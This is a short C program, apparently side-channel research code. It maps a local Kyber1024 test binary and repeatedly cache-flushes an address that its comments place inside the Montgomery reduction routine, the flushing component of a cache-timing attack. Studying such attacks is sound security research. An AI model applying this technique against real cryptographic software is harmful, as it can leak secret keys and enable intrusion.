#include <sys/mman.h>
#include "stdio.h"
#include "stdlib.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


// map the file
// flush the offest 

char* kyber_path = "./test_kyber1024";

int main(void){
    int fp = open(kyber_path, O_RDONLY);

    struct stat file_stat;
    int x = fstat(fp,&file_stat);
    
    char*  file_addr = (char*) mmap(0, file_stat.st_size, PROT_READ, MAP_SHARED, fp, 0);
    
    if(file_addr < 0){
       printf("error");
    }

   
    
    // inside montgomery -hope is that instructions are in 2 blocks
    // unsigned long flush_addr_offset = 0x58c5; // --> 10ms
    unsigned long flush_addr_offset = 0x5755; // reutrn call iin montgomery
    

    unsigned long addr = (unsigned long)file_addr + flush_addr_offset;

    for(;;){
        asm __volatile__(
        "clflush 0(%0)\n\t"
        :
        :"r"(addr)
        :
        );
    }
    


}